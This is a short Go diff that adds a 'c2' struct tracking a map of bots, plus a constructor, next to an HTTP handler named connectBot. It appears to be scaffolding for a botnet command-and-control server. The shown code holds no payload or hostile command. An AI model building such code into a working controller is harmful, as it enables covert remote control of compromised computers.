@@ -28,9 +28,15 @@ type Bot struct {
 // 	Result  string
 // }
 
-// type c2 struct {
-// 	bots map[string]Bot
-// }
+type c2 struct {
+	bots map[string]Bot
+}
+
+func Newc2() *c2 {
+	return &c2{
+		bots: make(map[string]Bot),
+	}
+}
 
 func connectBot(w http.ResponseWriter, r *http.Request) {
 	b := Bot{
